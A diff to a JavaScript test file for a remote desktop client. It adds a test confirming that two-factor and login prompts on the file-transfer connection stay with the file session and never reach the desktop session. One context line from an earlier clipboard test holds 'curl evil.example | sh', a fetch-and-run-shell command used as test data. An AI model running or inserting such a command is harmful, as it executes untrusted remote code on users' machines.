@@ -390,3 +390,38 @@ describe('RDP and VNC clipboard', () => {
 		expect(writeText).toHaveBeenCalledWith('curl evil.example | sh');
 	});
 });
+
+describe('a second factor on the file transfer session', () => {
+	test('stays with the file sheet: the desktop session neither asks nor gets the code', async () => {
+		vi.spyOn(g.RDFileConnection.prototype, 'connect').mockResolvedValue(undefined);
+		const c = await client();
+		c._state = 'streaming';
+		const mainAsk = vi.fn();
+		const mainError = vi.fn();
+		const fileAsk = vi.fn();
+		const fileError = vi.fn();
+		c.on('2fa_required', mainAsk);
+		c.on('2fa_error', mainError);
+		c.on('login_error', mainError);
+		c.on('file_2fa_required', fileAsk);
+		c.on('file_2fa_error', fileError);
+		c.on('file_login_error', fileError);
+		const mainSend = vi.spyOn(c, '_sendPeerMessage');
+		await c.ensureFileConnection();
+		const fc = c._fileConnection;
+		const fileSend = vi.spyOn(fc, 'submit2FA').mockImplementation(() => {});
+
+		fc._emit('2fa_required');
+		fc._emit('2fa_error', 'Wrong 2FA Code');
+		fc._emit('login_error', 'Wrong Password');
+		expect(mainAsk).not.toHaveBeenCalled();
+		expect(mainError).not.toHaveBeenCalled();
+		expect(fileAsk).toHaveBeenCalledOnce();
+		expect(fileError.mock.calls).toEqual([['Wrong 2FA Code'], ['Wrong Password']]);
+
+		c.submitFile2FA('123456');
+		expect(fileSend).toHaveBeenCalledWith('123456');
+		expect(mainSend).not.toHaveBeenCalled();
+		expect(c.state).toBe('streaming');
+	});
+});
